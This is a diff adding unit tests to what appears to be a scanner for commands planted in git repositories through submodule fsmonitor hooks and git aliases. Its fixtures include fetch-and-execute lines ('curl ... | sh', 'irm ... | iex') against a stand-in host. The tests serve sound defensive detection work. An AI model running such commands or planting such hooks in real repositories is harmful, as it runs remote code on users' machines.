@@ -543,6 +543,51 @@ class TestAScriptAnyCommandRunsIsJudged(TestPlantedCommandsAreCaught):
         self.assert_tier(repo, CONFIRMED)
 
 
+class TestSubmodulesAreReadInTheirOwnTree(TestPlantedCommandsAreCaught):
+    """Check a submodule whose git directory sits inside it, or is named by a `.git` file alone."""
+
+    SCRIPT = "#!/bin/sh\ncurl -fsSL https://x.invalid/p | sh\n"
+
+    def _gitmodules(self, repo: Path) -> None:
+        self.write(repo, ".gitmodules", '[submodule "sub"]\n\tpath = sub\n\turl = ./sub\n')
+
+    def test_an_embedded_git_directory(self):
+        repo = self.repo()
+        self._gitmodules(repo)
+        self.git(repo / "sub" if (repo / "sub").mkdir() is None else repo, "init", "-q")
+        self.append_config(repo, "[core]\n\tfsmonitor = ./mon.sh\n", rel="sub/.git/config")
+        self.hook(repo / "sub", "mon.sh", self.SCRIPT)
+        self.assert_tier(repo, CONFIRMED)
+
+    def test_a_git_file_without_a_configured_worktree(self):
+        repo = self.repo()
+        self._gitmodules(repo)
+        module = repo / ".git" / "modules" / "sub"
+        module.mkdir(parents=True)
+        (module / "HEAD").write_text("ref: refs/heads/main\n")
+        (module / "config").write_text("[core]\n\tfsmonitor = ./fetch.sh\n")
+        (repo / "sub").mkdir()
+        (repo / "sub" / ".git").write_text(f"gitdir: {module}\n")
+        self.hook(repo / "sub", "fetch.sh", self.SCRIPT)
+        self.assert_tier(repo, CONFIRMED)
+
+
+class TestPowerShellWordsNeedPowerShell(ExecSurfaceSandbox):
+    """Check `iex` outside PowerShell: a hostname, or Elixir's shell."""
+
+    def test_none_is_confirmed(self):
+        repo = self.repo()
+        self.append_config(repo, "[alias]\n\tq = !curl -s https://sandbox.iex.cloud/stable/quote | jq .\n"
+                                 "\tdev = !curl -sf localhost:4000/health && iex -S mix phx.server\n"
+                                 "\tdep = !wget -q https://hex.pm/x.ez && iex -S mix\n")
+        self.assertEqual([], [f.evidence for f in self.graded(repo)[CONFIRMED]])
+
+    def test_a_download_piped_into_iex_is_confirmed(self):
+        repo = self.repo()
+        self.append_config(repo, "[alias]\n\tps = !pwsh -c \\\"irm https://x.invalid | iex\\\"\n")
+        self.assertTrue(self.graded(repo)[CONFIRMED])
+
+
 class TestAShellBuiltinIsNotAnEvaluator(ExecSurfaceSandbox):
     """Check shell `exec`, which replaces the process and evaluates nothing."""
 
